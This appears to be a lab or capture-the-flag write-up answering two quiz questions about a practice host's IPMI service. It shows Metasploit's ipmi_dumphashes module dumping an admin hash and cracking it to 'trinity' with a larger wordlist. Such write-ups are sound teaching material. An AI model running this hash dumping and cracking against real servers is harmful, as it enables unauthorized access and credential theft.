## Question 1
>What username is configured for accessing the host via IPMI?

We could use metasploit `ipmi_dumphashes` to find username and password hashes : 
```shell
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                              Required  Description
   ----                  ---------------                              --------  -----------
   CRACK_COMMON          true                                         yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                   no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordli  yes       File containing common passwords for offline cracking, one per line
                         sts/ipmi_passwords.txt
   RHOSTS                                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                                                                s/using-metasploit.html
   RPORT                 623                                          yes       The target port
   SESSION_MAX_ATTEMPTS  5                                            yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                            yes       Delay between session retries in seconds
   THREADS               1                                            yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordli  yes       File containing usernames, one per line
                         sts/ipmi_users.txt


View the full module info with the info, or info -d command.
```

After setting up, run the metasploit : 
```shell
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.7.148:623 - IPMI - Hash found: admin:455bc4f082000000b73ed700d58cd87fee6d738063a87b8e4cc88e42f2d79af4f6a25ac26c320217a123456789abcdefa123456789abcdef140561646d696e:10a56e713f5fb40eaa090157a4b2ca49dec8e6c0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Here we've found a username `admin` with the hash password 

### Answer : `admin`

---
## Question 2 
>What is the account's cleartext password?

We've found the hash previously, but there are no any output. This happens because the wordlist provided by `metasploit` was too small, so we need to switch to `seclist` passwords wordlist : 
```shell
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set PASS_FILE /usr/share/seclists/Passwords/Most-Popular-Letter-Passes.txt
PASS_FILE => /usr/share/seclists/Passwords/Most-Popular-Letter-Passes.txt
```

And here is the results : 
```shell
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.7.148:623 - IPMI - Hash found: admin:af08efd8820c0000f246f819f36f0fdc921d2082a3bf7edfdac17ed5b03ea66f4d56ea66b70db6a5a123456789abcdefa123456789abcdef140561646d696e:9429769ae63852a0b8f9944cfab9d6b9289a5a5c
[+] 10.129.7.148:623 - IPMI - Hash for user 'admin' matches password 'trinity'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Answer : `trinity`